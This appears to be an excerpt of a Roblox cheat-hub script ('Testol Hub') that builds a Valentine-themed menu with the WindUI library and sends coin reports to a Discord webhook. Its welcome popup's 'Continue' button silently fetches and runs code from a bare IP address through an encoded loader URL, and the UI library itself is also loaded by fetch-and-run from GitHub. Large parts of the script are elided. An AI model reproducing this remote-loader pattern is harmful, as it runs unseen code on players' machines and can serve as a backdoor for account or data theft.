...
WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratleahh/fork-ig/refs/heads/main/main%20(1).lua"))() 

-- Set Valentine's theme (Rose theme is closest to Valentine's colors)
pcall(function()
    WindUI:SetTheme("Rose")
end)

WindUI:UpdateFont("rbxasset://fonts/families/FredokaOne.json")
...
WindUI:Popup({Title="Testol Hub",Icon="home",Desc="Welcome! Ready to get started?",Color=Color3.fromRGB(120, 60, 90),Buttons={{Title="Exit",Callback=function()
end,Variant="Tertiary"},{Title="Continue",Callback=function()
	Confirmed = true;
	-- Execute external script after user clicks continue
    loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImQzODFmNDhmLTI5YjYtNDEzNi1hMDczLTM0ZjM5NzAyYzZmMyIsImtpbmQiOiJsb2FkZXIifQ"))()
...
local Window = WindUI:CreateWindow({
    ...
    OpenButton = {
        ...
        Color = ColorSequence.new(
            Color3.fromRGB(140, 70, 100), -- Muted border (less RGB)
            Color3.fromRGB(160, 90, 120)  -- Muted border (less RGB)
        )
    },
    Topbar = {
        Height = 44,
...
-- Window:SetUIScale(.8)  -- example leaves this commented; use library default so buttons/sizing match
...
do
    Window:Tag({
        Title = "Revamped!",
        Icon = "github",
        Color = Color3.fromRGB(90, 25, 55), -- Muted tag (less RGB)
        Border = true,
    })
end
...
-- */  Tabs  /* --
local Tabs = {
    HomeTab = Sections.HomeSection:Tab({ Title = "Welcome", Icon = "home", Desc = "Get started with Testol Hub", IconColor = Blue, IconShape = "Square", Border = true }),
                    ...
                    if reportingInterval ~= "Disabled" then
                        ...
                        if intervalMinutes and (tick() - lastReportTime) >= (intervalMinutes * 60) then
                            ...
                            if webhookEnabled and webhookUrl ~= "" and webhookUrl:match("discord.com/api/webhooks") then
                                pcall(function()
                                    local data = {
                                        username = "Testol Hub Coin Detection",
                                        embeds = {{
